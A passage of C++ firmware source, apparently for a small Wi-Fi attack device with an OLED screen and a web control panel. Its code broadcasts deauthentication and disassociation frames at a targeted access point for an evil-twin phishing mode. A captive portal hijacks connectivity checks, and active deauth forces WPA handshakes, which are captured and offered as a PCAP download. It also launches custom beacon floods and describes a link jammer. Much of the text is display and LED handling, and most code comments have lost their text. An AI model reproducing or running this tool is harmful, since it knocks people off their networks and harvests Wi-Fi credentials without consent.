        // ：
        wifi_tx_broadcast_deauth((void*)phishingTargetBSSID, 7, 2, 500);
        wifi_tx_broadcast_deauth((void*)phishingTargetBSSID, 1, 2, 500);
        wifi_tx_broadcast_disassoc((void*)phishingTargetBSSID, 8, 1, 500);
      }
      lastPhishingBroadcastMs = now;
    }
  }

  if (currentTime - last_web_check >= WEB_CHECK_INTERVAL) {
    last_web_check = currentTime;
    WiFiClient client = web_server.available();
    if (client) {
      handleWebTestClient(client);
    }
  }

}

// Web UI
void displayWebUIStatus() {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  
  {
    const char* t = "192.168.1.1";
    int w = u8g2_for_adafruit_gfx.getUTF8Width(t);
    int x = (display.width() - w) / 2; if (x < 0) x = 0;
    u8g2_for_adafruit_gfx.setCursor(x, 10);
    u8g2_for_adafruit_gfx.print(t);
  }
  // ：SSID，，
  {
    String ssidLine = String("SSID: ") + String(WEB_UI_SSID);
    int textW = u8g2_for_adafruit_gfx.getUTF8Width(ssidLine.c_str());
    const int y = 25;
    static int ssidScrollX = 0;
    static unsigned long ssidLastScrollMs = 0;
    const int scrollDelay = 150; // ms
    if (textW <= display.width() - 2) {
      int x = (display.width() - textW) / 2; if (x < 0) x = 0;
      u8g2_for_adafruit_gfx.setCursor(x, y);
      u8g2_for_adafruit_gfx.print(ssidLine);
      ssidScrollX = 0;
    } else {
      if (millis() - ssidLastScrollMs > (unsigned)scrollDelay) {
        ssidScrollX = (ssidScrollX + 2) % (textW + 16);
        ssidLastScrollMs = millis();
      }
      int startX = ssidScrollX;
      u8g2_for_adafruit_gfx.setCursor(2 - startX, y);
      u8g2_for_adafruit_gfx.print(ssidLine);
      u8g2_for_adafruit_gfx.setCursor(2 - startX + textW + 16, y);
      u8g2_for_adafruit_gfx.print(ssidLine);
    }
  }
  // ：，，
  {
    String pwdLine = String("Pass: ") + String(WEB_UI_PASSWORD);
    int textW = u8g2_for_adafruit_gfx.getUTF8Width(pwdLine.c_str());
    const int y = 40;
    static int pwdScrollX = 0;
    static unsigned long pwdLastScrollMs = 0;
    const int scrollDelay = 150; // ms
    if (textW <= display.width() - 2) {
      int x = (display.width() - textW) / 2; if (x < 0) x = 0;
      u8g2_for_adafruit_gfx.setCursor(x, y);
      u8g2_for_adafruit_gfx.print(pwdLine);
      pwdScrollX = 0;
    } else {
      if (millis() - pwdLastScrollMs > (unsigned)scrollDelay) {
        pwdScrollX = (pwdScrollX + 2) % (textW + 16);
        pwdLastScrollMs = millis();
      }
      int startX = pwdScrollX;
      u8g2_for_adafruit_gfx.setCursor(2 - startX, y);
      u8g2_for_adafruit_gfx.print(pwdLine);
      u8g2_for_adafruit_gfx.setCursor(2 - startX + textW + 16, y);
      u8g2_for_adafruit_gfx.print(pwdLine);
    }
  }
  {
    const char* b = "BACK to exit";
    int wb = u8g2_for_adafruit_gfx.getUTF8Width(b);
    int xb = (display.width() - wb) / 2; if (xb < 0) xb = 0;
    u8g2_for_adafruit_gfx.setCursor(xb, 55);
    u8g2_for_adafruit_gfx.print(b);
  }
  
  display.display();
}
// Web
void handleWebClient(WiFiClient& client) {
  String request = "";
  unsigned long timeout = millis() + 2000; // 2
  
  // HTTP
  while (client.connected() && millis() < timeout) {
    if (client.available()) {
      char c = client.read();
      request += c;
      if (request.endsWith("\r\n\r\n")) {
        break;
      }
    }
    delay(1);
  }
  
  // ，
  if (request.length() == 0) {
    Serial.println("[WebClient] Empty request or timeout");
    return;
  }
  
  // 
  String method = "GET";
  String path = "/";
  int firstSpace = request.indexOf(' ');
  int secondSpace = request.indexOf(' ', firstSpace + 1);
  if (firstSpace > 0 && secondSpace > firstSpace) {
    method = request.substring(0, firstSpace);
    path = request.substring(firstSpace + 1, secondSpace);
  }
  
  // POST，
  if (method == "POST") {
    // Content-Length
    int contentLengthPos = request.indexOf("Content-Length: ");
    if (contentLengthPos >= 0) {
      int contentLengthEnd = request.indexOf("\r\n", contentLengthPos);
      if (contentLengthEnd > contentLengthPos) {
        String contentLengthStr = request.substring(contentLengthPos + 16, contentLengthEnd);
        int contentLength = contentLengthStr.toInt();
        
        // 
        if (contentLength > 0 && contentLength < 1024) { // 
          String body = "";
          unsigned long bodyTimeout = millis() + 1000; // 1
          while (client.available() < contentLength && millis() < bodyTimeout) {
            delay(1);
          }
          
          for (int i = 0; i < contentLength && client.available(); i++) {
            body += (char)client.read();
          }
          
          // 
          request += body;
        }
      }
    }
  }
  
  // Captive Portal: ，204
  if (path == "/generate_204" || path == "/gen_204" || path == "/ncsi.txt" || path == "/hotspot-detect.html" || path.startsWith("/connecttest.txt") || path.startsWith("/library/test/success.html") || path.startsWith("/success.txt")) {
    String body = "<html><head><meta http-equiv=\"refresh\" content=\"0; url=/\"></head><body></body></html>";
    String hdr = "HTTP/1.1 200 OK\r\n";
    hdr += "Content-Type: text/html\r\n";
    hdr += "Cache-Control: no-cache\r\n";
    hdr += "Content-Length: " + String(body.length()) + "\r\n";
    hdr += "Connection: close\r\n\r\n";
    client.print(hdr);
    client.print(body);
  }
  // （）
  else if (path == "/" || path == "/index.html") {
    // ，，Web UI
    if (quick_capture_completed) {
      sendQuickCapturePage(client);
    } else {
      sendWebPage(client);
    }
  } else if (method == "POST" && path == "/custom-beacon") {
    // POSTssidband（x-www-form-urlencodedJSON）
    String body = "";
    int bodyStartPos = request.indexOf("\r\n\r\n");
    if (bodyStartPos >= 0) {
      body = request.substring(bodyStartPos + 4);
    }

    // ssid
    String ssid = "";
    // urlencoded: ssid=...
    int ssidPos = body.indexOf("ssid=");
    if (ssidPos >= 0) {
      int end = body.indexOf('&', ssidPos);
      if (end < 0) end = body.length();
      ssid = urlDecode(body.substring(ssidPos + 5, end));
    }
    // JSON: "ssid":"..."
    if (ssid.length() == 0) {
      int j1 = body.indexOf("\"ssid\":\"");
      if (j1 >= 0) {
        int j2 = body.indexOf('"', j1 + 8);
        if (j2 > j1) ssid = body.substring(j1 + 8, j2);
      }
    }

    // band
    String band = "mixed";
    int bandPos = body.indexOf("band=");
    if (bandPos >= 0) {
      int end = body.indexOf('&', bandPos);
      if (end < 0) end = body.length();
      band = urlDecode(body.substring(bandPos + 5, end));
    }
    if (band.length() == 0) {
      int k1 = body.indexOf("\"band\":\"");
      if (k1 >= 0) {
        int k2 = body.indexOf('"', k1 + 9);
        if (k2 > k1) band = body.substring(k1 + 9, k2);
      }
    }

    // ：
    ssid.replace("%20", " ");

    // ：0=,1=5G,2=2.4G
    if (band == "mixed") {
      beaconBandMode = 0;
    } else if (band == "5g" || band == "5G") {
      beaconBandMode = 1;
    } else {
      beaconBandMode = 2;
    }

    // 
    if (ssid.length() > 0) {
      startCustomBeaconFromWeb(ssid);
      String resp = "{\"success\":true,\"message\":\"custom beacon started\"}";
      String hdr = "HTTP/1.1 200 OK\r\n";
      hdr += "Content-Type: application/json\r\n";
      hdr += "Content-Length: " + String(resp.length()) + "\r\n";
      hdr += "Connection: close\r\n\r\n";
      client.print(hdr);
      client.print(resp);
    } else {
      String resp = "{\"success\":false,\"message\":\"ssid required\"}";
      String hdr = "HTTP/1.1 400 Bad Request\r\n";
      hdr += "Content-Type: application/json\r\n";
      hdr += "Content-Length: " + String(resp.length()) + "\r\n";
      hdr += "Connection: close\r\n\r\n";
      client.print(hdr);
      client.print(resp);
    }
  } else if (path == "/status") {
    handleStatusRequest(client);
  } else if (path == "/capture") {
    // 
    sendQuickCapturePage(client);
  } else if (path == "/capture/download") {
    // PCAP
    sendPcapDownload(client);
  } else if (path == "/capture/status") {
    // API
    sendCaptureStatus(client);
  } else if (method == "POST" && path == "/stop") {
    // minimal stop for custom beacon
    beaconAttackRunning = false;
    becaonstate = 0;
    stopAttackLED();
    String resp = "{\"success\":true,\"message\":\"stopped\"}";
    String hdr = "HTTP/1.1 200 OK\r\n";
    hdr += "Content-Type: application/json\r\n";
    hdr += "Content-Length: " + String(resp.length()) + "\r\n";
    hdr += "Connection: close\r\n\r\n";
    client.print(hdr);
    client.print(resp);
  } else if (method == "POST" && path == "/handshake/scan") {
    // Graceful scan: stop AP services, perform scan, restart AP, results kept
    // ：
    if (!g_scanDone) {
      // Stop WebUI AP (clients will disconnect briefly)
      stopDNSServer();
      stopWebServer();
      wifi_off();
      delay(200);
      wifi_on(RTW_MODE_STA);
      delay(200);
    }
    // Start scan async in the background state variables
    scan_results.clear();
    g_scanDone = false;
    // unsigned long startMs = millis(); // 
    if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
      // Let loop-side status endpoint report progress
    }
    // Stash a marker that a scan is in progress
    hs_sniffer_running = false; // not used; reuse web_ui_active flag
    String hdr = "HTTP/1.1 200 OK\r\nConnection: close\r\n\r\n";
    client.print(hdr);
  } else if (path == "/handshake/scan-status") {
    bool done = g_scanDone;
    String json = String("{\"done\":") + (done?"true":"false") + "}";
    String hdr = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: " + String(json.length()) + "\r\nConnection: close\r\n\r\n";
    client.print(hdr);
    client.print(json);
  } else if (path == "/handshake/scan-results") {
    // Restart AP and return results as HTML
    // Restart original AP
    wifi_off();
    delay(200);
    wifi_on(RTW_MODE_AP);
    delay(300);
    {
      char channel_str[4];
      sprintf(channel_str, "%d", WEB_UI_CHANNEL);
      if (!WiFi.apbegin(WEB_UI_SSID, WEB_UI_PASSWORD, channel_str, 0)) {
        // fallback attempt without password semantics
        WiFi.apbegin((char*)WEB_UI_SSID, (char*)WEB_UI_PASSWORD, channel_str, 0);
      }
    }
    // IP
    IPAddress apIp;
    unsigned long t0 = millis();
    do { apIp = WiFi.localIP(); delay(50); } while (apIp[0]==0 && millis()-t0<2000);
    startWebUIServices(apIp);
    String html;
    html.reserve(1024);
    html += "<table><tr><th>SSID</th><th>BSSID</th><th>CH</th><th>RSSI</th><th>Sel</th></tr>";
    for (size_t i=0;i<scan_results.size() && i<64;i++){
      const WiFiScanResult &r = scan_results[i];
      html += "<tr><td>" + (r.ssid.length()? r.ssid: String("<Hidden>")) + "</td><td>" + r.bssid_str + "</td><td>" + String(r.channel) + "</td><td>" + String(r.rssi) + "</td><td>";
      html += "<button onclick=\"selectNetwork('" + r.bssid_str + "')\">Select</button>";
      html += "</td></tr>";
    }
    html += "</table>";
    String hdr = "HTTP/1.1 200 OK\r\n";
    hdr += "Content-Type: text/html; charset=UTF-8\r\n";
    hdr += "Content-Length: " + String(html.length()) + "\r\n";
    hdr += "Connection: close\r\n\r\n";
    client.print(hdr);
    client.print(html);
  } else if (method == "POST" && path.startsWith("/handshake/select")) {
    // parse bssid from query or body
    String bssidStr = "";
    int qpos = path.indexOf('?');
    if (qpos >= 0 && qpos + 1 < (int)path.length()) {
      String qs = path.substring(qpos + 1);
      int p = qs.indexOf("bssid=");
      if (p >= 0) { bssidStr = qs.substring(p + 6); }
    }
    if (bssidStr.length() == 0) {
      int bodyPos = request.indexOf("\r\n\r\n");
      if (bodyPos >= 0) {
        String body = request.substring(bodyPos + 4);
        int k = body.indexOf("bssid=");
        if (k >= 0) { bssidStr = urlDecode(body.substring(k + 6)); }
      }
    }
    hs_has_selection = false;
    if (bssidStr.length() > 0) {
      for (size_t i=0;i<scan_results.size();i++){
        if (scan_results[i].bssid_str == bssidStr) {
          hs_selected_network = scan_results[i];
          hs_has_selection = true;
          break;
        }
      }
    }
    String hdr = "HTTP/1.1 200 OK\r\nConnection: close\r\n\r\n";
    client.print(hdr);
  } else if (method == "POST" && path == "/handshake/capture") {
    // Map selection to handshake globals and start
    if (hs_has_selection) {
      // Parse mode from body (active|passive|efficient)
      String mode = "active";
      int bodyPos = request.indexOf("\r\n\r\n");
      if (bodyPos >= 0) {
        String body = request.substring(bodyPos + 4);
        int m = body.indexOf("mode=");
        if (m >= 0) {
          int amp = body.indexOf('&', m);
          mode = urlDecode(body.substring(m + 5, amp >= 0 ? amp : body.length()));
        }
      }
      // Populate globals expected by handshake.h
      memcpy(_selectedNetwork.bssid, hs_selected_network.bssid, 6);
      _selectedNetwork.ssid = hs_selected_network.ssid;
      _selectedNetwork.ch = hs_selected_network.channel;
      AP_Channel = String(current_channel);
      // Configure capture mode
      if (mode == "passive") {
        g_captureMode = CAPTURE_MODE_PASSIVE;
        g_captureDeauthEnabled = false;
      } else if (mode == "efficient") {
        g_captureMode = CAPTURE_MODE_EFFICIENT;
        g_captureDeauthEnabled = false; // 
      } else {
        g_captureMode = CAPTURE_MODE_ACTIVE;
        g_captureDeauthEnabled = true;
      }
      Serial.print("[WebUI] Capture mode: "); Serial.println(mode);
      isHandshakeCaptured = false;
      handshakeDataAvailable = false;
      readyToSniff = true;
      hs_sniffer_running = true;
      // LED
      startHandshakeLED();
    }
    String hdr = "HTTP/1.1 200 OK\r\nConnection: close\r\n\r\n";
    client.print(hdr);
  } else if (method == "POST" && path == "/handshake/stop") {
    readyToSniff = false;
    hs_sniffer_running = false;
    // WebUI LED
    if (web_ui_active) {
      startWebUILED();
    }
    String hdr = "HTTP/1.1 200 OK\r\nConnection: close\r\n\r\n";
    client.print(hdr);
  } else if (path == "/handshake/status") {
    size_t savedSize = (size_t)globalPcapData.size();
    bool captured = handshakeDataAvailable || (savedSize > 0) || isHandshakeCaptured;
    String json = "{";
    json += "\"running\":" + String(hs_sniffer_running ? "true":"false") + ",";
    json += "\"captured\":" + String(captured ? "true":"false") + ",";
    json += "\"justCaptured\":" + String(handshakeJustCaptured ? "true":"false") + ",";
    json += "\"hsCount\":" + String((unsigned long)lastCaptureHSCount) + ",";
    json += "\"mgmtCount\":" + String((unsigned long)lastCaptureMgmtCount) + ",";
    json += "\"ts\":" + String((unsigned long)lastCaptureTimestamp) + 
            ",\"pcapSize\":" + String((unsigned long)savedSize) + "}";
    String hdr = "HTTP/1.1 200 OK\r\n";
    hdr += "Content-Type: application/json\r\n";
    hdr += "Content-Length: " + String(json.length()) + "\r\n";
    hdr += "Connection: close\r\n\r\n";
    client.print(hdr);
    client.print(json);
    // justCaptured ，
    if (handshakeJustCaptured) handshakeJustCaptured = false;
  } else if (method == "POST" && path == "/handshake/delete") {
    resetGlobalHandshakeData();
    String hdr = "HTTP/1.1 200 OK\r\nConnection: close\r\n\r\n";
    client.print(hdr);
  } else if (path == "/handshake/options") {
    // Return <option> list for dropdown
    String html;
    html.reserve(2048);
    for (size_t i=0;i<scan_results.size() && i<128;i++) {
      const WiFiScanResult &r = scan_results[i];
      String label = (r.ssid.length()? r.ssid: String("<Hidden>"));
      label += String(" | ") + r.bssid_str + String(" | CH") + String(r.channel) + String(" | RSSI ") + String(r.rssi);
      html += String("<option value=\"") + r.bssid_str + String("\">") + label + String("</option>");
    }
    String hdr = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: " + String(html.length()) + "\r\nConnection: close\r\n\r\n";
    client.print(hdr);
    client.print(html);
  } else if (path == "/handshake/download") {
    // Return PCAP data
    const std::vector<uint8_t> &buf = (globalPcapData.size() > 0) ? globalPcapData : globalPcapData;
    String hdr = "HTTP/1.1 200 OK\r\n";
    hdr += "Content-Type: application/octet-stream\r\n";
    hdr += "Content-Disposition: attachment; filename=\"capture.pcap\"\r\n";
    hdr += "Content-Length: " + String((unsigned long)buf.size()) + "\r\n";
    hdr += "Connection: close\r\n\r\n";
    client.print(hdr);
    if (!buf.empty()) { client.write(buf.data(), buf.size()); }
  } else {
    // ：
    String hdr = "HTTP/1.1 302 Found\r\n";
    hdr += "Location: /\r\n";
    hdr += "Cache-Control: no-cache\r\n";
    hdr += "Connection: close\r\n\r\n";
    client.print(hdr);
  }
  
  client.stop();
}

// Web
void sendWebPage(WiFiClient& client) {
  size_t pageLen = strlen_P(WEB_ADMIN_HTML);
  String header = "HTTP/1.1 200 OK\r\n";
  header += "Content-Type: text/html; charset=UTF-8\r\n";
  header += "Cache-Control: public, max-age=300\r\n";
  header += "Content-Length: " + String(pageLen) + "\r\n";
  header += "Connection: close\r\n\r\n";
  client.print(header);
  // WebUI
  client.print(F(WEB_ADMIN_HTML));
}


// 
void handleStatusRequest(WiFiClient& client) {
  String json = "{";
  bool apRunning = web_ui_active || web_test_active;
  json += "\"ap_running\":" + String(apRunning ? "true" : "false") + ",";
  json += "\"connected_clients\":" + String(web_client.connected() ? 1 : 0) + ",";
  json += "\"ssid\":\"" + String(web_test_active ? web_test_ssid_dynamic : WEB_UI_SSID) + "\",";
  json += "\"deauth_running\":" + String(deauthAttackRunning ? "true" : "false") + ",";
  json += "\"beacon_running\":" + String(beaconAttackRunning ? "true" : "false");
  json += "}";
  
  String header = "HTTP/1.1 200 OK\r\n";
  header += "Content-Type: application/json\r\n";
  header += "Content-Length: " + String(json.length()) + "\r\n";
  header += "Connection: close\r\n\r\n";
  
  client.print(header);
  client.print(json);
}



// 404
/* removed: legacy WebUI 404 */
void send404Response(WiFiClient& client) {
  String header = "HTTP/1.1 404 Not Found\r\n";
  header += "Content-Type: text/plain\r\n";
  header += "Connection: close\r\n\r\n";
  
  client.print(header);
  client.print("404 Not Found");
}


// ============ Web UI ============
// ，OLED

// （Web UI）
static String g_customBeaconSSID;
static bool g_customBeaconStable = false; // /

void startCustomBeaconFromWeb(const String& ssid) {
  beaconAttackRunning = true;
  g_customBeaconSSID = ssid;
  // 
  g_customBeaconStable = false;
  // 4
  becaonstate = 4;
  startAttackLED();
  Serial.println("=== Web UI: Custom SSID Beacon ===");
  Serial.println("SSID: " + g_customBeaconSSID);
}

void executeCustomBeaconFromWeb() {
  static unsigned long lastRun = 0;
  static unsigned long lastBlinkTime = 0;
  static bool redState = false;
  const unsigned long runInterval = 5; // 
  const unsigned long blinkInterval = 600;

  unsigned long now = millis();
  if (now - lastBlinkTime >= blinkInterval) {
    redState = !redState;
    digitalWrite(LED_R, redState ? HIGH : LOW);
    lastBlinkTime = now;
  }

  if (!beaconAttackRunning) return;
  if (g_customBeaconSSID.length() == 0) return;

  if (now - lastRun < runInterval) return;
  lastRun = now;

  // mixed/5G/2.4G beaconBandMode ， executeCrossBandBeaconAttackWeb 
  // ""：/2.4G6；5G36
  int originalChannel = (beaconBandMode == 1) ? 36 : 6;
  executeCrossBandBeaconAttackWeb(g_customBeaconSSID, originalChannel, g_customBeaconStable);
}


// ============ LED ============

// LED
void updateLEDs() {
  unsigned long currentTime = millis();
  
  // ，LED
  extern bool hs_sniffer_running;
  if (hs_sniffer_running) {
    return; // LED，
  }
  
  // ：
  digitalWrite(LED_B, HIGH);
  
  // ：WebUI
  if (web_ui_active) {
    digitalWrite(LED_G, HIGH);
  } else {
    digitalWrite(LED_G, LOW);
  }
  
  // ：
  if (deauthAttackRunning || beaconAttackRunning) {
    if (currentTime - lastRedLEDBlink >= RED_LED_BLINK_INTERVAL) {
      redLEDState = !redLEDState;
      digitalWrite(LED_R, redLEDState ? HIGH : LOW);
      lastRedLEDBlink = currentTime;
    }
  } else {
    digitalWrite(LED_R, LOW);
  }
}

// LED
void startAttackLED() {
  Serial.println("Start attack - LED blink");
  digitalWrite(LED_R, HIGH);
  lastRedLEDBlink = millis();
}

// LED
void stopAttackLED() {
  Serial.println("Stop attack - LED off");
  digitalWrite(LED_R, LOW);
}

// WebUI LED
void startWebUILED() {
  Serial.println("Start WebUI - LED on");
  digitalWrite(LED_G, HIGH);
}

// WebUI LED
void closeWebUILED() {
  Serial.println("Close WebUI - LED off");
  digitalWrite(LED_G, LOW);
}

// LED（LED）
void startHandshakeLED() {
  Serial.println("Start capture - LED off");
  digitalWrite(LED_R, LOW);
  digitalWrite(LED_G, LOW);
  digitalWrite(LED_B, LOW);
  Serial.println("LED off");
}

// LED（）
void completeHandshakeLED() {
  Serial.println("Capture done - LED on");
  digitalWrite(LED_R, LOW);
  digitalWrite(LED_G, HIGH);
  digitalWrite(LED_B, LOW);
  Serial.println("LED green on");
}
// ============ ============

// ，" attack..."WiFi
void showAttackStatusPage(const char* attackType) {
  static unsigned long lastBlinkTime = 0;
  static bool wifiVisible = true;
  static int blinkCount = 0;
  static bool inBlinkCycle = false;
  const unsigned long BLINK_INTERVAL = 3000; // 3
  const unsigned long BLINK_DURATION = 150; // 150ms
  
  unsigned long currentTime = millis();
  
  // WiFi3
  if (!inBlinkCycle && (currentTime - lastBlinkTime >= BLINK_INTERVAL)) {
    // 
    inBlinkCycle = true;
    blinkCount = 0;
    wifiVisible = false; // ，
    lastBlinkTime = currentTime;
  }
  
  if (inBlinkCycle) {
    // ，150ms
    if (currentTime - lastBlinkTime >= BLINK_DURATION) {
      wifiVisible = !wifiVisible;
      lastBlinkTime = currentTime;
      
      if (!wifiVisible) {
        blinkCount++;
        if (blinkCount >= 3) {
          // ，
          inBlinkCycle = false;
          wifiVisible = true; // 
          lastBlinkTime = currentTime; // 
        }
      }
    }
  }
  
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  
  // 
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  
  // 
  int textWidth = u8g2_for_adafruit_gfx.getUTF8Width(attackType);
  int textX = (display.width() - textWidth) / 2;
  int textY = 25; // 
  
  u8g2_for_adafruit_gfx.setCursor(textX, textY);
  u8g2_for_adafruit_gfx.print(attackType);
  
  // WiFi（）
  if (wifiVisible) {
    int wifiX = (display.width() - 19) / 2; // WiFi19
    int wifiY = 42; // 
    display.drawBitmap(wifiX, wifiY, image_wifi_not_connected__copy__bits, 19, 16, WHITE);
  }
  
  display.display();
}

// ============ AP ============

// AP
bool showApFloodInfoPage() {
  // 
  unsigned long lastBackTime = 0;
  unsigned long lastOkTime = 0;

  while (true) {
    unsigned long currentTime = millis();

    // 
    if (digitalRead(BTN_BACK) == LOW) {
      if (currentTime - lastBackTime <= DEBOUNCE_DELAY) continue;
      // 
      while (digitalRead(BTN_BACK) == LOW) { delay(10); }
      delay(200); // 
      return false; // 
    }

    // 
    if (digitalRead(BTN_OK) == LOW) {
      if (currentTime - lastOkTime <= DEBOUNCE_DELAY) continue;
      // 
      while (digitalRead(BTN_OK) == LOW) { delay(10); }
      delay(200); // 
      return true; // AP
    }

    // 
    display.clearDisplay();
    display.setTextSize(1);

    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);

    // （）
    const char* line1 = "Good for home AP";
    const char* line2 = "& portable WiFi";
    const char* line3 = "Weak vs hotspot";

    int w1 = u8g2_for_adafruit_gfx.getUTF8Width(line1);
    int w2 = u8g2_for_adafruit_gfx.getUTF8Width(line2);
    int w3 = u8g2_for_adafruit_gfx.getUTF8Width(line3);

    int x1 = (display.width() - w1) / 2;
    int x2 = (display.width() - w2) / 2;
    int x3 = (display.width() - w3) / 2;

    u8g2_for_adafruit_gfx.setCursor(x1, 15);
    u8g2_for_adafruit_gfx.print(line1);
    u8g2_for_adafruit_gfx.setCursor(x2, 30);
    u8g2_for_adafruit_gfx.print(line2);
    u8g2_for_adafruit_gfx.setCursor(x3, 45);
    u8g2_for_adafruit_gfx.print(line3);

    // 
    u8g2_for_adafruit_gfx.setCursor(5, 60);
    u8g2_for_adafruit_gfx.print("《 Back");
    u8g2_for_adafruit_gfx.setCursor(85, 60);
    u8g2_for_adafruit_gfx.print("Continue 》");

    display.display();

    delay(10); // CPU
  }
}

// ============ ============

// 
bool showLinkJammerInfoPage() {
  // 
  unsigned long lastBackTime = 0;
  unsigned long lastOkTime = 0;
  
  while (true) {
    unsigned long currentTime = millis();
    
    // 
    if (digitalRead(BTN_BACK) == LOW) {
      if (currentTime - lastBackTime <= DEBOUNCE_DELAY) continue;
      // 
      while (digitalRead(BTN_BACK) == LOW) { delay(10); }
      delay(200); // 
      return false; // 
    }
    
    // 
    if (digitalRead(BTN_OK) == LOW) {
      if (currentTime - lastOkTime <= DEBOUNCE_DELAY) continue;
      // 
      while (digitalRead(BTN_OK) == LOW) { delay(10); }
      delay(200); // 
      return true; // 
    }
    
    // 
    display.clearDisplay();
    display.setTextSize(1);
    
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    
    // （）
    const char* line1 = "Jam new conn only";
    const char* line2 = "Ignores WPA";
    const char* line3 = "Device dependent";
    
    // 
    int w1 = u8g2_for_adafruit_gfx.getUTF8Width(line1);
    int w2 = u8g2_for_adafruit_gfx.getUTF8Width(line2);
    int w3 = u8g2_for_adafruit_gfx.getUTF8Width(line3);
    
    int x1 = (display.width() - w1) / 2;
    int x2 = (display.width() - w2) / 2;
    int x3 = (display.width() - w3) / 2;
    
    u8g2_for_adafruit_gfx.setCursor(x1, 15);
    u8g2_for_adafruit_gfx.print(line1);
    u8g2_for_adafruit_gfx.setCursor(x2, 30);
    u8g2_for_adafruit_gfx.print(line2);
    u8g2_for_adafruit_gfx.setCursor(x3, 45);
    u8g2_for_adafruit_gfx.print(line3);
    
    // 
    u8g2_for_adafruit_gfx.setCursor(5, 60);
    u8g2_for_adafruit_gfx.print("《 Back");
    u8g2_for_adafruit_gfx.setCursor(85, 60);
    u8g2_for_adafruit_gfx.print("Continue 》");
    
    display.display();
    
    delay(10); // CPU
  }
}

// 
bool showBeaconTamperInfoPage() {
  // 
  unsigned long lastBackTime = 0;
  unsigned long lastOkTime = 0;
  
  while (true) {
    unsigned long currentTime = millis();
    
    // 
    if (digitalRead(BTN_BACK) == LOW) {
      if (currentTime - lastBackTime <= DEBOUNCE_DELAY) continue;
      // 
      while (digitalRead(BTN_BACK) == LOW) { delay(10); }
      delay(200); // 
      return false; // 
    }
    
    // 
    if (digitalRead(BTN_OK) == LOW) {
      if (currentTime - lastOkTime <= DEBOUNCE_DELAY) continue;
      // 
      while (digitalRead(BTN_OK) == LOW) { delay(10); }
      delay(200); // 
      return true; // 
    }
    
    // 
    display.clearDisplay();
    display.setTextSize(1);
    
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    
    // （）
    const char* line1 = "Swallowing targets";
    const char* line2 = "Beacon data sent";
    const char* line3 = "Effect varies";
    
    // 
    int w1 = u8g2_for_adafruit_gfx.getUTF8Width(line1);
    int w2 = u8g2_for_adafruit_gfx.getUTF8Width(line2);
    int w3 = u8g2_for_adafruit_gfx.getUTF8Width(line3);
    
    int x1 = (display.width() - w1) / 2;
    int x2 = (display.width() - w2) / 2;
    int x3 = (display.width() - w3) / 2;
    
    u8g2_for_adafruit_gfx.setCursor(x1, 15);
    u8g2_for_adafruit_gfx.print(line1);
    u8g2_for_adafruit_gfx.setCursor(x2, 30);
    u8g2_for_adafruit_gfx.print(line2);
    u8g2_for_adafruit_gfx.setCursor(x3, 45);
    u8g2_for_adafruit_gfx.print(line3);
    
    // 
    u8g2_for_adafruit_gfx.setCursor(5, 60);
    u8g2_for_adafruit_gfx.print("《 Back");
    u8g2_for_adafruit_gfx.setCursor(85, 60);
    u8g2_for_adafruit_gfx.print("Continue 》");
    
    display.display();
    
    delay(10); // CPU
  }
}

// 
bool showBeaconTamperWarningPage() {
  // 
  unsigned long lastBackTime = 0;
  unsigned long lastOkTime = 0;
  
  while (true) {
    unsigned long currentTime = millis();
    
    // 
    if (digitalRead(BTN_BACK) == LOW) {
      if (currentTime - lastBackTime <= DEBOUNCE_DELAY) continue;
      // 
      while (digitalRead(BTN_BACK) == LOW) { delay(10); }
      delay(200); // 
      return false; // 
    }
    
    // 
    if (digitalRead(BTN_OK) == LOW) {
      if (currentTime - lastOkTime <= DEBOUNCE_DELAY) continue;
      // 
      while (digitalRead(BTN_OK) == LOW) { delay(10); }
      delay(200); // 
      return true; // 
    }
    
    // 
    display.clearDisplay();
    display.setTextSize(1);
    
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    
    // （）
    const char* line1 = "May cause issues";
    const char* line2 = "May disrupt NICs";
    const char* line3 = "Use carefully!";
    
    // 
    int w1 = u8g2_for_adafruit_gfx.getUTF8Width(line1);
    int w2 = u8g2_for_adafruit_gfx.getUTF8Width(line2);
    int w3 = u8g2_for_adafruit_gfx.getUTF8Width(line3);
    
    int x1 = (display.width() - w1) / 2;
    int x2 = (display.width() - w2) / 2;
    int x3 = (display.width() - w3) / 2;
    
    u8g2_for_adafruit_gfx.setCursor(x1, 15);
    u8g2_for_adafruit_gfx.print(line1);
    u8g2_for_adafruit_gfx.setCursor(x2, 30);
    u8g2_for_adafruit_gfx.print(line2);
    u8g2_for_adafruit_gfx.setCursor(x3, 45);
    u8g2_for_adafruit_gfx.print(line3);
    
    // 
    u8g2_for_adafruit_gfx.setCursor(5, 60);
    u8g2_for_adafruit_gfx.print("《 Back");
    u8g2_for_adafruit_gfx.setCursor(85, 60);
    u8g2_for_adafruit_gfx.print("Continue 》");
    
    display.display();
    
    delay(10); // CPU
  }
}

// ============ ============
// 

void homeActionSelectSSID() {
  drawssid();
}

void homeActionAttackMenu() {
  drawattack();
}

void homeActionQuickScan() {
  // ，
  stabilizeButtonState();
  if (showConfirmModal("Quick Scan")) {
    drawscan();
  }
}

void homeActionPhishing() {
  if (SelectedVector.empty()) {
    if (showSelectSSIDConfirmModal()) {
      drawssid(); // AP/SSID
    }
  } else if (g_webTestLocked || g_webUILocked) {
    display.clearDisplay();
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, 20);
    u8g2_for_adafruit_gfx.print("To free resources");
    u8g2_for_adafruit_gfx.setCursor(5, 40);
    u8g2_for_adafruit_gfx.print("Reboot required");
